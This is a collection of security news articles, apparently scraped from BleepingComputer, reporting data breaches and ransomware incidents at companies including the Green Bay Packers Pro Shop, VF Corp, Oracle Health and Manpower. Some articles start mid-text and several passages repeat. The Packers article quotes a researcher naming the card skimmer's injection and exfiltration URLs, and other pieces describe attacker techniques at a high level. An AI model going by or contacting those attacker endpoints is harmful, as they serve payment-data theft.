""Promptly after detecting unauthorized activity, the Company took steps to contain and respond to the incident, including launching an investigation, with assistance from leading third-party cybersecurity experts, and notifying relevant law enforcement,"" reads the DocGo SEC filing . While the Company did not share how they responded to the incident, organizations commonly shut down their IT systems after detecting a breach to prevent the spread of the attack.

Hacker leaks account data of 12 million Zacks Investment users,https://www.bleepingcomputer.com/news/security/hacker-leaks-account-data-of-12-million-zacks-investment-users/,Bill Toulas,"February 13, 2025","Zacks Investment Research (Zacks) last year reportedly suffered another data breach that exposed sensitive information related to roughly 12 million accounts. Zacks is an American investment research company that provides its customers data-driven insights through a proprietary stock performance assessment tool called ‘Zacks Rank’, to help with making informed financial decisions. In late January, a threat actor published data samples on a hacker forum, claiming a breach at Zacks in June 2024 that exposed data of millions of customers. The published data, available to forum members in exchange for a small cryptocurrency amount, contains full names, usernames, email addresses, physical addresses, and phone numbers. BleepingComputer contacted Zacks multiple times to ask about the authenticity of the data, but we have not heard back. However, the threat actor told BleepingComputer that they gained access to the company's active directory as a domain admin and then stole source code for the main site (Zacks.com) and 16 other websites, including some internal websites. They also shared samples of the source code they had stolen as proof of the new breach. Earlier today, the leaked Zacks database was added to Have I Been Pwned , a website where users can check if their personal data has been compromised. HIBP confirmed that the file included 12 million unique email addresses, along with IP addresses, names, passwords in the form of unsalted SHA-256 hashes, phone numbers, physical addresses, and usernames. However, the service also notes that roughly 93% of the leaked email addresses were already in its database from past breaches of the same platform or other services. Zacks has not confirmed the alleged breach but if the data leak proves to be the result of a new hack, it may be the third major data breach impacting the company in the past four years. In January 2023, Zacks disclosed that hackers had breached its networks between November 2021 and August 2022, and gained access to sensitive information of 820,000 customers . A few months later, in June 2023, HIBP validated a separate database originating from Zacks, and which had been leaked earlier. That database contained email addresses, usernames, unsalted SHA256 passwords, addresses, phone numbers, and the full names of 8,8 million individuals using Zacks’ services. According to Troy Hunt, the creator of the HIBP service, the data appeared to have been dumped in May 2020, indicating that it resulted from an older incident. The latest leak of Zacks customers, while not officially validated, has been verified by HIBP before adding it to the service and there is a very high degree of confidence that it comes from a new incident. It should be noted that there is also the possibility of threat actors scraping the information from other services and compiling a database with user information associated with Zacks.

The National Football League team says it immediately disabled all checkout and payment capabilities after discovering on October 23 that the packersproshop.com website was breached. ""On October 23, 2024, we were alerted to the presence of malicious code inserted on the Pro Shop website by a third party threat actor,"" the Packers's Director of Retail Operations Chrysta Jorgensen explains in breach notification letters sent to potentially affected individuals. ""Immediately upon learning this, we temporarily disabled all payment and checkout capabilities on the Pro Shop website and began an investigation."" The NFL team also hired outside cybersecurity experts to investigate the incident's impact and find if any customer information had been accessed. The investigation revealed that the malicious code inserted in the checkout page could steal personal and payment information between late September and early October 2024. However, the Packers say the attacker couldn't intercept information from payments made using a gift card, Pro Shop website account, PayPal, or Amazon Pay. ""We also immediately required the vendor that hosts and manages the Pro Shop website to remove the malicious code from the checkout page, refresh its passwords, and confirm there were no remaining vulnerabilities,"" Jorgensen added. ""Based on the results of the forensic investigation, on December 20, 2024 we discovered that the malicious code may have allowed an unauthorized third party to view or acquire certain customer information entered at the checkout that used a limited set of payment options on the Pro Shop website between September 23-24, 2024 and October 3-23, 2024."" Dutch e-commerce security company Sansec, which notified Packers of the breach, found that the skimming attack used a JSONP callback and YouTube's oEmbed feature to bypass the Content Security Policy (CSP). ""In this attack, a script was injected from https://js-stats.com/getInjector. This script harvested data from input, select, and textarea fields on the site, exfiltrating the captured information to https://js-stats.com/fetchData,"" Sansec said in a report published December 31. Personal and payment data impacted in the breach includes information entered on the Pro Shop website when making a purchase, such as names, addresses (billing and shipping), email addresses, as well as credit card types, numbers, expiration dates, and verification numbers. The Packers has yet to share the number of customers impacted by this data breach or how the threat actor could hack into its Pro Shop website to inject the card skimmer script. The NFL team now offers those affected by this breach three years of credit monitoring and identity theft restoration services through Experian and advises them to monitor their account statements for any fraudulent activity. Those who observe suspected incidents of identity theft or fraud attempts should immediately report them to their bank and relevant authorities, including their state attorney general and the Federal Trade Commission (FTC). Two years ago, the San Francisco 49ers also notified more than 20,000 individuals that their personal information (including Social Security numbers) was stolen in a February 2022 ransomware attack claimed by the Blackbyte cybercrime gang.

""In this attack, a script was injected from https://js-stats.com/getInjector. This script harvested data from input, select, and textarea fields on the site, exfiltrating the captured information to https://js-stats.com/fetchData,"" Sansec said in a report published December 31. Personal and payment data impacted in the breach includes information entered on the Pro Shop website when making a purchase, such as names, addresses (billing and shipping), email addresses, as well as credit card types, numbers, expiration dates, and verification numbers. The Packers has yet to share the number of customers impacted by this data breach or how the threat actor could hack into its Pro Shop website to inject the card skimmer script. The NFL team now offers those affected by this breach three years of credit monitoring and identity theft restoration services through Experian and advises them to monitor their account statements for any fraudulent activity. Those who observe suspected incidents of identity theft or fraud attempts should immediately report them to their bank and relevant authorities, including their state attorney general and the Federal Trade Commission (FTC). Two years ago, the San Francisco 49ers also notified more than 20,000 individuals that their personal information (including Social Security numbers) was stolen in a February 2022 ransomware attack claimed by the Blackbyte cybercrime gang.

The actor tried to extort the company by threatening to publish 37GB of data that includes backups and details about the company’s cloud infrastructure and internal applications. Europcar Mobility Group is a subsidiary of Green Mobility Holding that operates the Europcar, Goldcar, and Ubeeqo brands with a diverse offering of compact cars, luxury vehicles, vans, and trucks. The company's customer base is substantial, spread across 140 countries in Europe, North America, Asia, and Africa. In late March, a threat actor using the company’s name as an alias, announced that they “successfully breached Europcar's systems and obtained all their GitLab repositories.” They claimed to have copied from the repositories more than 9,000 SQL files with backups that have personal data, and at least 269 .ENV files - used to store configuration settings for applications, environment variables, and sensitive information. To prove that the breach is not a hoax, Europcar the threat actor published screenshots of credentials present in the source code they stole. BleepingComputer received confirmation that the compromise is real and that Europcar Mobility Group is currently assessing the extent of the damage. The threat actor’s claim that they stole all the company’s GitLab repositories is not entirely accurate, though. We learned that a small part of the source code remained untouched. While the full extent of the damage is still being evaluated, the stolen data includes only names and email addresses of Goldcar and Ubeeqo users. Based on online statistics, the number of affected customers may be between 50,000 and 200,000, some of them from 2017 and 2020. More sensitive information, like bank and card details, or passwords has not been exposed. The company is now in the process of notifying all impacted customers and has notified the data protection authority in the country. It is unclear how the threat actor managed to gain access to Europcar’s code repositories but many recent breaches were fueled by credentials stolen in infostealer compromises. Last year, Europcar was the target of a fake breach, when someone claimed on a hacker forum to possess the personal info (names, addresses, birth dates, driver's license numbers) of nearly 50 million customers. In 2022, a researcher discovered an admin token in the code of Europcar’s apps for mobile devices (Android and iOS), which could be used to access customers’ biometric details. The issue was due to a development error and affected multiple mobile applications from other service providers.

Switzerland says government data stolen in ransomware attack,https://www.bleepingcomputer.com/news/security/switzerland-says-government-data-stolen-in-ransomware-attack/#comment_form,Bill Toulas,"June 30, 2025","The government in Switzerland is informing that sensitive information from various federal offices has been impacted by a ransomware attack at the third-party organization Radix. The hackers have stolen data from Radix systems and later leaked it on the dark web, the Swiss government says. The exposed data is being analyzed with the help of the country’s National Cyber Security Centre (NCSC) to determine which government agencies are impacted and to what effect. “The foundation Radix has been targeted by a ransomware attack, during which data was stolen and encrypted,” announced the Swiss government . “Radix’s customers include various federal offices. The data has been published on the dark web and will now be analyzed by the relevant offices.” Radix is a Zurich-based non-profit organization dedicated to health promotion. It operates eight competence centers that carry out projects and services commissioned by the Swiss federal government, cantonal and municipal authorities, and other public and private organizations. The organization issued a statement saying that Sarcoma ransomware affiliates compromised its systems on June 16. Sarcoma is a rapidly emerging ransomware group that began operations in October 2024, quickly becoming one of the most active by claiming 36 victims in its first month. One notable case was an attack against PCB giant Unimicron . Sarcoma gains access through phishing, older vulnerabilities, and supply-chain attacks. Then the hackers typically rake advantage of RDP connections and move laterally on the network. In the last stage of the attack, the threat actor steals data and may also encrypt it. The threat actor published the data stolen from Radix on their leak portal on the dark web on June 29, likely after extortion efforts failed. Radix says it informed impacted individuals via personalized notifications and notes that there is no evidence that sensitive data from partner organizations was affected. Meanwhile, Sarcoma appears to have published a 1.3TB archive on its extortion portal, including several document scans, financial records, contracts, and communications. The data is being offered for free. To mitigate this risk, Radix suggests that potentially exposed individuals remain vigilant over the coming months and be wary of attempts to get their passwords, credit card numbers, and account credentials. BleepingComputer has contacted NCSC to request more information about the data unearthed by the ongoing investigations, but a comment wasn’t immediately available. In March 2024, the Swiss government confirmed it had suffered a similar exposure via third-party software services provider Xplain, which was breached by the Play ransomware group on May 23, 2023.

HellCat hackers go on a worldwide Jira hacking spree,https://www.bleepingcomputer.com/news/security/hellcat-hackers-go-on-a-worldwide-jira-hacking-spree/#comment_form,Ionut Ilascu,"March 20, 2025","Swiss global solutions provider Ascom has confirmed a cyberattack on its IT infrastructure as a hacker group known as Hellcat targets Jira servers worldwide using compromised credentials. The company announced in a press release that hackers on Sunday breached its technical ticketing system and is currently investigating the incident. Ascom is a telecommunications company with subsidiaries in 18 countries focusing on wireless on-site communications. HellCat hacking group claimed the attack and told BleepingComputer that they stole about 44GB of data that may impact all of the company’s divisions. Ascom says that the hackers compromised its technical ticketing system, the incident had no impact on the company’s business operations, and that customers and partners do not need to take any preventive action. “Investigations against such criminal offenses were initiated immediately and are ongoing. Ascom is working closely with the relevant authorities” - Ascom Rey, a member of the HellCat hacking group, told BleepingComputer that they stole from Ascom source code for multiple products, details about various projects, invoices, confidential documents, and issues from the ticketing system. The Swiss company did not provide technical details about the breach but targeting the Jira ticketing system has become a common attack method for the HellCat hackers. Jira is a project management and issue-tracking platform commonly used by software developers and IT teams to track and manage projects. The platform often contains sensitive data, such as source code, authentication keys, IT plans, customer information, and internal discussions related to these projects. Previous incidents claimed by HellCat and confirmed by the targeted companies count Schneider Electric , Telefónica , and Orange Group , and in all three instances the hackers breached their way in through Jira servers. Recently, the same hackers also took responsibility for an attack on the British multinational car maker Jaguar Land Rover (JLR) and stole and leaked about 700 internal documents. As the threat actor describes it, the leak includes “development logs, tracking data, source codes” and an employee’s data that exposed “sensitive information such as username, email, display name, timezone, and more.” Alon Gal , co-founder and CTO at threat intelligence company Hudson Rock, says the JLR breach follows a pattern specific to HellCat hackers. “At the heart of this latest incident lies a technique that has become HELLCAT’s signature: exploiting Jira credentials harvested from compromised employees that were infected by Infostealers” - Alon Gal The researcher said that the JLR incident was possible by using the credentials of an LG Electronics employee with third-party credentials to JLR’s Jira server. Gal highlights that the compromised credentials were not fresh and had been exposed for several years but remained valid all this time, allowing hackers to take advantage. HellCat’s activity didn’t stop at these breaches as the threat actor announced today that they compromised the Jira system of Affinitiv, a marketing company that provides data analytics a platform for OEMs and dealerships in the automotive industry. The threat actor confirmed to BleepingComputer that they breached Affinitiv through a Jira system and disclosed publicly that they stole a database with a little over 470,000 “unique emails” and more than 780,000 records. When contacted by BleepingComputer about the alleged attack, Affinitiv said that they had begun an investigation. To prove the breach, hackers published two screenshots with names, email addresses, postal addresses, and dealership names. Alon Gal is warning that Jira “has become a prime target for attackers due to its centrality in enterprise workflows and the wealth of data it houses” and this type of access can be used to “move laterally, escalate privileges, and extract sensitive information.” As credentials collected by infostealers are easy to find and given that some of them remain unchanged for years as companies fail to include them in a regular rotation process, such attacks will likely become more frequent.

VF Corp. is a Colorado-based apparel firm owning 13 globally recognized brands. The company employs 35,000 people and has an annual revenue of $11.6 billion. Apart from the brands mentioned above, VF Corp. owns Dickies, Eastpak, Kipling, Napapijri, AND1, JanSport, Icebreaker, Altra Running, and SmartWool. In a Form 8-K disclosure filed with the U.S. SEC (Securities and Exchange Commission) on Friday, VF informed shareholders of a cyberattack that occurred on December 13, 2023. In response to the detected unauthorized access on its network, the company shut down some of its systems and brought in external experts to help contain the attack. However, the threat actors managed to encrypt some of the company's computers and steal personal data. ""The threat actor disrupted the company's business operations by encrypting some IT systems, and stole data from the company, including personal data,"" warned VF Corp. It is unclear if the stolen data impacts only employees, suppliers, resellers, partners, or customers. While the attack bears all the hallmarks of a ransomware attack, at the time of writing this, no ransomware groups have taken responsibility for the incident. The impact of the incident on the company's operation is significant and is expected to have a lasting effect on the business. ""The company is working to bring the impacted portions of its IT systems back online and implement workarounds for certain offline operations with the aim of reducing disruption to its ability to serve its retail and brand e-commerce consumers and wholesale customers,"" reads the SEC filing . ""As of the date of this filing, the incident has had and is reasonably likely to continue to have a material impact on the company's business operations until recovery efforts are completed."" VF Corp says its physical retail stores will operate normally worldwide. Still, customers will likely experience delays in the fulfillment of online orders or an inability to place orders on some of the said brands' e-commerce sites. The company is still assessing the full extent of the security breach and its potential impact on financials and operations. The timing of the incident during the Christmas shopping season no doubt exacerbates the situation.

Vans and North Face owner VF Corp hit by ransomware attack,https://www.bleepingcomputer.com/news/security/vans-and-north-face-owner-vf-corp-hit-by-ransomware-attack/,Bill Toulas,"December 18, 2023","American global apparel and footwear giant VF Corporation, the owner of brands like Supreme, Vans, Timberland, and The North Face, has disclosed a security incident that caused operational disruptions. VF Corp. is a Colorado-based apparel firm owning 13 globally recognized brands. The company employs 35,000 people and has an annual revenue of $11.6 billion. Apart from the brands mentioned above, VF Corp. owns Dickies, Eastpak, Kipling, Napapijri, AND1, JanSport, Icebreaker, Altra Running, and SmartWool. In a Form 8-K disclosure filed with the U.S. SEC (Securities and Exchange Commission) on Friday, VF informed shareholders of a cyberattack that occurred on December 13, 2023. In response to the detected unauthorized access on its network, the company shut down some of its systems and brought in external experts to help contain the attack. However, the threat actors managed to encrypt some of the company's computers and steal personal data. ""The threat actor disrupted the company's business operations by encrypting some IT systems, and stole data from the company, including personal data,"" warned VF Corp. It is unclear if the stolen data impacts only employees, suppliers, resellers, partners, or customers. While the attack bears all the hallmarks of a ransomware attack, at the time of writing this, no ransomware groups have taken responsibility for the incident. The impact of the incident on the company's operation is significant and is expected to have a lasting effect on the business. ""The company is working to bring the impacted portions of its IT systems back online and implement workarounds for certain offline operations with the aim of reducing disruption to its ability to serve its retail and brand e-commerce consumers and wholesale customers,"" reads the SEC filing . ""As of the date of this filing, the incident has had and is reasonably likely to continue to have a material impact on the company's business operations until recovery efforts are completed."" VF Corp says its physical retail stores will operate normally worldwide. Still, customers will likely experience delays in the fulfillment of online orders or an inability to place orders on some of the said brands' e-commerce sites. The company is still assessing the full extent of the security breach and its potential impact on financials and operations. The timing of the incident during the Christmas shopping season no doubt exacerbates the situation.

Lovesac confirms data breach after ransomware attack claims,https://www.bleepingcomputer.com/news/security/lovesac-confirms-data-breach-after-ransomware-attack-claims/,Bill Toulas,"September 8, 2025","American furniture brand Lovesac is warning that it suffered a data breach impacting an undisclosed number of individuals, stating their personal data was exposed in a cybersecurity incident. Lovesac is a furniture designer, manufacturer, and retailer, operating 267 showrooms across the United States, and having annual net sales of $750 million. They are best known for their modular couch systems called 'sactionals,' as well as their bean bags called 'sacs.' According to the notices sent to impacted individuals , between February 12, 2025, and March 3, 2025, hackers gained unauthorized access to the company's internal systems and stole data hosted on those systems. Lovesac discovered the breach on February 28, 2025, which means it took them three days to fully remediate the situation and block the threat actor's access to its network. The data that has been stolen includes full names and other personal information that hasn't been disclosed in the notice sample shared with the Attorney General's offices. The company has not clarified whether the incident impacts customers, employees, or contractors, and neither has it disclosed the exact number of individuals affected. Enclosed in the notification letter, recipients will find instructions on enrolling in 24 24-month credit monitoring service through Experian, redeemable until November 28, 2025. The company noted that it currently has no indication that the stolen information has been misused, but urges impacted individuals to remain vigilant against phishing attempts. Although Lovesac does not name the attackers and didn't mention data encryption in the letters, the RansomHub ransomware gang claimed an attack on March 3, 2025. The threat actors added Lovesac onto their extortion portal, announcing the breach, indicating plans to leak the stolen data if a ransom payment isn't made. We were unable to determine if they followed up with this threat. The RansomHub ransomware-as-a-service (RaaS) operation emerged in February 2024 and has since amassed a roster of high-profile victims, including staffing firm Manpower , oilfield services giant Halliburton , the Rite Aid pharmacy chain, Kawasaki's European division , the Christie's auction house, U.S. telecom provider Frontier Communications , the Planned Parenthood healthcare nonprofit, and Italy's Bologna Football Club . The ransomware operation quietly shut down in April 2025, with many of their affiliates moving to DragonForce.

The incident exposed all users who had logged in to the mail service since 2016, estimated at 1,023,800 people, along with contact entries for an additional 93,000 users. Cock.li is a Germany-based free email hosting provider with a privacy-focused ethos and lax moderation policies, run by a single operator known as 'Vincent Canfield' since 2013. It is promoted as an alternative to mainstream email providers, supporting standard security protocols like SMTP, IMAP, and TLS. Cock.li is used by people who distrust major providers and members of infosec and open-source communities. It is also popular among cybercriminals, such as affiliates from Dharma, Phobos, and other ransomware gangs. Late last week, the Cock.li service was disrupted without public explanation, leaving users wondering what might have happened. Soon after, a threat actor claimed to be selling two databases containing dumped from Cock.li that contained sensitive user information, offering them for sale for a minimum of one Bitcoin ($92.5k). Cock.li published a statement on its website yesterday, confirming the breach and the validity of the threat actor's claims. The email service confirmed that the following information has been exposed for 1,023,800 user accounts: The service's announcement clarifies that user account passwords, email content, and IP addresses were not compromised, as these are not present in the stolen databases. Meanwhile, the 10,400 account holders who had third-party contact information exposed will be getting a separate notification. For everyone who used the service since 2016, it is recommended to reset their account passwords. The Cock.li data breach could be valuable to researchers and law enforcement, as the exposed information can be used to learn more about the threat actors who use the platform. Cock.li says they believe the data was stolen using an old RoundCube SQL injection vulnerability tracked as CVE-2021-44026. This breach comes just as Cock.li recently analyzed an RCE flaw in Roundcube, CVE-2025-49113, which is believed to be actively exploited in attacks . Their analysis led them to remove the software from their platform in June 2025. ""Cock.li will no longer be offering Roundcube webmail,"" explained the service admins.

WSU is an educational institute in Australia offering a wide range of undergraduate, postgraduate, and research programs across various disciplines. It has 47,000 students and over 4,500 regular and seasonal staff, and it operates on a budget of $600 million (USD). In an announcement posted on the Western Sydney University website today, the University warned that hackers had accessed its Microsoft Office 365 environment, including email accounts and SharePoint files. ""The investigation has indicated that the earliest known unauthorised access to the University's Microsoft Office 365 environment was on 17 May 2023 and included access to some email accounts and SharePoint files,"" reads the WSU announcement . ""Investigations also indicate that the University's Solar Car Laboratory infrastructure may have been used as part of the incident."" The data that has been exposed varies per individual depending on the contents of the email communications and the documents stored in the University's SharePoint environment. This intrusion was only discovered much later, in January 2024, with the University's IT team shutting the unauthorized access and launching an internal investigation into the incident, also involving specialists from the NSW Police, CrowdStrike, and CyberCX. The investigation's results have verified the impact on approximately 7,500 individuals, who will soon receive personalized notices via email and phone. However, this might not be the final figure, as the University noted that investigations are still ongoing. WSU has not shared many details about the nature of the security incident, but it does not appear to involve system encryption or extortion based on threats to leak stolen data. ""There have been no threats received by the University to disclose any of the private information which was accessed, and the University has not received any demands in exchange for maintaining privacy."" – WSU. WSU added that the University's core operations haven't been impacted, so the incident is not expected to disrupt classes, exams, registrations, or research programs. The University has evaluated the security measures introduced post-compromise as adequate to prevent the re-occurrence of similar incidents and has been granted an injunction from the NSW Supreme Court to prevent the dissemination of any data that was accessed/stolen during the attack. While threat actors do not normally care about court injuctions, it was also likely used to prevent the media or others from publishing any stolen data they receive. At the time of writing, no ransomware or extortion groups have claimed responsibility for the attack at WSU, so the perpetrators remain unknown.

Orange Belgium provides fixed and mobile connectivity services to over 3 million customers in Belgium and Luxembourg, employs 1,500 staff, and claims to operate the largest 4G/5G network in the country. Last year, the company reported total service revenues of €1.34 billion. When BleepingComputer reached out on Wednesday for more details regarding last month's breach, an Orange Belgium spokesperson stated that the company couldn't confirm whether any systems were encrypted during the incident, but said that the breach wasn't the result of attacks targeting telecom companies worldwide that have been linked to China's Salt Typhoon cyber-espionage group . The spokesperson added that Orange Belgium is aware of the threat group behind the breach, but didn't name them due to an ongoing investigation.

While the threat actors didn't gain access to the passwords, email addresses, or financial information of impacted customers, they were able to compromise systems containing some account information . ""However, the hacker gained access to one of our IT systems containing the following data: surname, first name, telephone number, SIM card number, PUK code, tariff plan,"" it added. Orange Belgium is notifying all customers affected by this incident via email or SMS, advising them to remain vigilant for any suspicious messages or calls because fraudsters could use the stolen information to impersonate Orange or another company and trick them into sharing other sensitive data like passwords and banking information."" BleepingComputer was also told that this breach is a separate incident from the cyberattack disclosed by Orange Group at the end of July, when its parent company announced that it had detected a breached system on its network on July 25. The Orange Group breach in July led to some operational disruptions, but they primarily affected French customers. In February, Orange's Romanian branch also confirmed the breach of a non-critical application after a threat actor claimed to have stolen thousands of internal documents, containing 380,000 email addresses, as well as employee data, user records, source code, invoices, and contracts.

Oracle Health breach compromises patient data at US hospitals,https://www.bleepingcomputer.com/news/security/oracle-health-breach-compromises-patient-data-at-us-hospitals/,Lawrence Abrams,"March 28, 2025","A breach at Oracle Health impacts multiple US healthcare organizations and hospitals after a threat actor stole patient data from legacy servers. Oracle Health has not yet publicly disclosed the incident, but in private communications sent to impacted customers and from conversations with those involved, BleepingComputer confirmed that patient data was stolen in the attack. Oracle Health, formerly known as Cerner, is a healthcare software-as-a-service (SaaS) company offering Electronic Health Records (EHR) and business operations systems to hospitals and healthcare organizations. After being acquired by Oracle in 2022, Cerner was merged into Oracle Health, with its systems migrated to Oracle Cloud. In a notice sent to impacted customers and seen by BleepingComputer, Oracle Health said it became aware of a breach of legacy Cerner data migration servers on February 20, 2025. ""We are writing to inform you that, on or around February 20, 2025, we became aware of a cybersecurity event involving unauthorized access to some amount of your Cerner data that was on an old legacy server not yet migrated to the Oracle Cloud,"" reads a notification sent to impacted Oracle Health customers. Oracle says that the threat actor used compromised customer credentials to breach the servers sometime after January 22, 2025, and copied data to a remote server. This stolen data ""may"" have included patient information from electronic health records. However, multiple sources told BleepingComputer that it was confirmed that patient data was stolen during the attack. Oracle Health is also telling hospitals that they will not notify patients directly and that it is their responsibility to determine if the stolen data violates HIPAA laws and whether they are required to send notifications. However, the company says they will help identify impacted individuals and provide templates to help with notifications. It is not known if ransomware was deployed in the attack or if it was purely data theft, with BleepingComputer told that the details of the attack were not shared with customers. Furthermore, it is unclear how a customer's credentials could have allowed the theft of data from multiple organizations. Sources have told BleepingComputer that the impacted hospitals are being extorted by an individual threat actor going by the name ""Andrew"" who has not claimed affiliation with any known ransomware or extortion groups.

Oracle Health breach compromises patient data at US hospitals,https://www.bleepingcomputer.com/news/security/oracle-health-breach-compromises-patient-data-at-us-hospitals/#comment_form,Lawrence Abrams,"March 28, 2025","A breach at Oracle Health impacts multiple US healthcare organizations and hospitals after a threat actor stole patient data from legacy servers. Oracle Health has not yet publicly disclosed the incident, but in private communications sent to impacted customers and from conversations with those involved, BleepingComputer confirmed that patient data was stolen in the attack. Oracle Health, formerly known as Cerner, is a healthcare software-as-a-service (SaaS) company offering Electronic Health Records (EHR) and business operations systems to hospitals and healthcare organizations. After being acquired by Oracle in 2022, Cerner was merged into Oracle Health, with its systems migrated to Oracle Cloud. In a notice sent to impacted customers and seen by BleepingComputer, Oracle Health said it became aware of a breach of legacy Cerner data migration servers on February 20, 2025. ""We are writing to inform you that, on or around February 20, 2025, we became aware of a cybersecurity event involving unauthorized access to some amount of your Cerner data that was on an old legacy server not yet migrated to the Oracle Cloud,"" reads a notification sent to impacted Oracle Health customers. Oracle says that the threat actor used compromised customer credentials to breach the servers sometime after January 22, 2025, and copied data to a remote server. This stolen data ""may"" have included patient information from electronic health records. However, multiple sources told BleepingComputer that it was confirmed that patient data was stolen during the attack. Oracle Health is also telling hospitals that they will not notify patients directly and that it is their responsibility to determine if the stolen data violates HIPAA laws and whether they are required to send notifications. However, the company says they will help identify impacted individuals and provide templates to help with notifications. It is not known if ransomware was deployed in the attack or if it was purely data theft, with BleepingComputer told that the details of the attack were not shared with customers. Furthermore, it is unclear how a customer's credentials could have allowed the theft of data from multiple organizations. Sources have told BleepingComputer that the impacted hospitals are being extorted by an individual threat actor going by the name ""Andrew"" who has not claimed affiliation with any known ransomware or extortion groups. The threat actor is demanding millions of dollars in cryptocurrency to prevent the leak or sale of stolen data and has created clearnet websites about the breach as a way to pressure the hospitals. BleepingComputer first contacted Oracle Health about this incident on March 4th but received no responses to our questions.

Together with Experis and Talent Solutions, the company is part of ManpowerGroup, a multinational corporation with over 600,000 workers in more than 2,700 offices and serving over 100,000 clients worldwide. Last year, ManpowerGroup reported revenues of $17.9 billion and a total gross profit of $3.1 billion. According to a data breach filing with the Office of Maine's Attorney General this week, Manpower is now alerting 144,189 individuals who were impacted by a data breach after undisclosed attackers gained access to the company's systems in late December. The company detected the incident while investigating an IT systems outage at a Lansing, Michigan, franchise on January 20. ""Through that investigation, we learned of information suggesting that an unknown actor gained unauthorized access to our network between December 29, 2024 and January 12, 2025 and potentially acquired certain files, some of which may have contained certain individuals' personal information,"" Manpower says in breach notification letters sent to affected individuals. ""On or about July 28, 2025, Manpower of Lansing learned that your personal information may have been involved in connection with the incident which is the reason for this notification."" After discovering the incident, the company states that it has strengthened its IT security to prevent future breaches and is now working with the FBI to hold the attackers accountable. Manpower is also offering those affected by this data breach free credit monitoring and identity theft protection services through Equifax. While the company has yet to attribute the attack to a specific threat actor or cybercrime group, the RansomHub ransomware operation claimed responsibility for the attack in January, after Manpower stated that it had discovered the breach. The ransomware gang claimed to have stolen approximately 500GB of data from Manpower's compromised systems, containing a wide range of client and corporate information. ​As the attackers said, the stolen files contained databases of clients, including personal and corporate data (passport scans, IDs, SSNs, addresses, contact information, test results, and other data), years of corporate correspondence, financial statements, HR data analytics, as well as confidential contracts and non-disclosure agreements. RansomHub has since removed the Manpower entry from its dark web leak site, suggesting that the company may have paid a ransom to have the data deleted. The RansomHub ransomware-as-a-service (RaaS) operation (previously known as Cyclops and Knight) surfaced in February 2024 and has since claimed many high-profile victims, including oil services giant Halliburton , the Rite Aid drugstore chain, Kawasaki's EU division , the Christie's auction house, US telecom provider Frontier Communications , the Planned Parenthood sexual health nonprofit, and the Bologna Football Club . This ransomware gang also leaked Change Healthcare's stolen data after the most significant healthcare breach in recent years, impacting over 190 million individuals , and the BlackCat/ALPHV ransomware operation's exit scam. One year ago, the FBI said RansomHub affiliates had breached over 200 critical infrastructure organizations in the United States as of August 2024. A ManpowerGroup spokesperson didn't provide more details when BleepingComputer reached out regarding the information exposed in the breach and RansomHub's claims, but stated that the incident didn't impact ManpowerGroup's corporate network. ""Earlier this year we were made aware that an independently owned and operated Manpower franchise in Lansing was impacted by a ransomware attack. This franchise operates on an independent data platform, making this an isolated incident where no ManpowerGroup corporate systems were affected,"" the spokesperson told BleepingComputer. ""All those impacted by the Lansing breach have been informed. ManpowerGroup is counseling the franchisee and supporting their efforts, while the franchisee manages the direct response.""

Zoomcar discloses security breach impacting 8.4 million users,https://www.bleepingcomputer.com/news/security/zoomcar-discloses-security-breach-impacting-84-million-users/,Bill Toulas,"June 16, 2025","Zoomcar Holdings (Zoomcar) has disclosed that unauthorized accessed its system led to a data breach impacting 8.4 million users. The incident was detected on June 9, after a threat actor emailed company employees alerting them of a cyberattack. Although there has been no material disruption to services, the company’s internal investigation confirmed that sensitive data belonging to a subset of its customers has been compromised. Zoomcar is an Indian peer-to-peer car-sharing marketplace that connects car owners with renters across emerging markets in Asia, offering short and medium-term vehicle rentals. The company became a U.S.‑listed, Delaware‑registered public company in late 2023, following a merger with an American blank-check firm IOAC, and its shares are now traded in Nasdaq (ZCAR). Adhering to U.S. financial reporting standards, the company is required report the incident to the U.S. Securities and Exchange Commission (SEC). “On June 9, 2025, Zoomcar Holdings, Inc. identified a cybersecurity incident involving unauthorized access to its information systems,” the company informs . “The Company became aware of the incident after certain employees received external communications from a threat actor alleging unauthorized access to Company data.” The results of its preliminary investigation show that the following data for 8.4 million customers has been exposed to an unauthorized party: Zoomcar says that there is no evidence of exposing users’ financial information, plaintext passwords, or any other sensitive data that could lead to the identification of individuals. The company underlined that it is still evaluating of the exact scope and potential impact of the security incident. At this time, the type of the attack hasn’t been determined and no ransomware group has assumed responsibility for the attack at Zoomcar. BleepingComputer has asked Zoomcar about the nature of the incident but we received no response.

IBM is a technology service provider for Janssen; specifically, it manages the CarePath application and database supporting its functions. CarePath is an application designed to help patients gain access to Janssen medications, offer discounts and cost-saving advice on eligible prescriptions, provides guidance on insurance coverage, and serves drug refiling and administering alerts. According to the notice on Janssen's site , the pharmaceutical firm became aware of a previously undocumented method that could give unauthorized users access to the CarePath database. The firm reported this to IBM, who promptly fixed the security gap and launched an internal investigation to assess if anyone had exploited the flaw. Unfortunately, the investigation that was concluded on August 2nd, 2023, showed that unauthorized users accessed the following CarePath user details: The exposure impacts CarePath users who enrolled on Janssen's online services before July 2nd, 2023, which might indicate that the breach occurred on that date or the breached database was a backup. Social security numbers and financial account data were not kept in the breached database, so those critical details have not been exposed. Also, the pharmaceutical firm has clarified that this security incident doesn't impact Janssen's Pulmonary Hypertension patients. The compromised data could support highly effective phishing, scamming, and social engineering attacks, and considering the value of medical data, there is a high chance they will be sold for a premium on darknet markets. IBM has published a separate announcement about the incident that says there are no indications the stolen data has been misused. Still, IBM urges Janssen CarePath users to remain vigilant and closely monitor their account statements for suspicious activity. Also, the tech giant is now offering a one-year credit monitoring free of charge to all impacted individuals to help protect them from fraud. Both announcements share toll-free numbers where providers and users may call to address their questions about the incident or get help enrolling in credit monitoring services. IBM is also among the hundreds of entities breached by Clop ransomware earlier this year when the notorious threat actors exploited a zero-day vulnerability on the MOVEit Transfer software used by numerous organizations worldwide. A couple of weeks back, the Colorado Department of Health Care Policy & Financing (HCPF) informed four million individuals that their personal and medical data had been exposed due to the breach on IBM. BleepingComputer has asked IBM about whether this incident is related to the MOVEit attack, and a spokesperson told us that it is a separate incident caused by different threat actors. On the question of how many people have been impacted, IBM told BleepingComputer that they are notifying all CarePath users.

